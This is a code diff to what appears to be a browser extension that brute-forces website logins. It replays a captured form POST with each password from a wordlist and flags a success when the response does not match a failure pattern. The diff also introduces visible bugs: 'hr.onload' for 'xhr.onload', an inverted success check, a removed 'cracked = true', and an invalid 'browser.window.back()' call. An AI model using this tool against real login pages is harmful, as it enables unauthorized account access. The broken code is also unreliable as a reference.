@@ -14,6 +14,7 @@ var un_f;
 var un_p;
 var ops;
 var pw;
+var landing;
 function handleMessage(msg) {
   msgHandler(msg);
 }
@@ -63,38 +64,37 @@ function cracking_request_listener(e) {
     };
     origin = e.originUrl;
     wordbyline = wordlist.split("\n");
-    for(var iter = 0; iter <= wordbyline.length-1; iter++) {
+for(var iter = 0; iter <= wordbyline.length-1;iter++) {
     ops = "";
-  location.reload();
-  pagedata.body.forEach(body => {
+browser.tabs.update({url: origin});
+pagedata.body.forEach(body => {
     if(body.value == crackuser) {
       ops = ops.concat(body.name, "=", crackuser, "&");
     }
-    if(body.value == "DUMMY") {
+    if(body.value == "DUMMYPASS") {
       ops = ops.concat( body.name, "=", wordbyline[iter], "&");
     }
-    if ((body.value != "DUMMY") && (body.value != crackuser)) {
+    if ((body.value != "DUMMYPASS") && (body.value != crackuser)) {
       ops = ops.concat( body.name, "=", body.value, "&");
     }
   });
+    ops = ops.slice(0, -1);
     var xhr = new XMLHttpRequest();
     xhr.open("POST", origin, true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     console.log("Trying: " + crackuser + " " + wordbyline[iter]);
     console.log("Sending to " + origin + ": " + ops);
     xhr.send(ops);
-    xhr.onload  = function() {
+    hr.onload  = function() {
       var databack = this.responseText;
-      if(databack.match(RegExp(failpattern), "ig") == null) {
+      if(databack.match(RegExp(failpattern), "ig") != null) {
         console.log(databack);
         pw = wordbyline[iter];
-        cracked = true;
 }
 }
       if(cracked == true) {
 break;
 }
-
 }
 if(cracked == true) {
       return new Promise(done => {
@@ -103,10 +103,14 @@ if(cracked == true) {
         type: "panel"
       }).then(w => {
  });
-    });
+stop_cracking_listener();    
+});
 
 }
-    done(e);
+else{
+browser.window.back();
+}  
+  done(e);
   });
   }
 
@@ -141,6 +145,7 @@ function user_confirm_cracking() {
         pattern = msg.docpattern;
         failpattern = msg.failpattern;
         crackuser = msg.crackuser;
+        landing = msg.landing;
         wordlist = msg.wordlist;
         browser.windows.getCurrent().then(wi => {
           browser.windows.remove(wi.id);
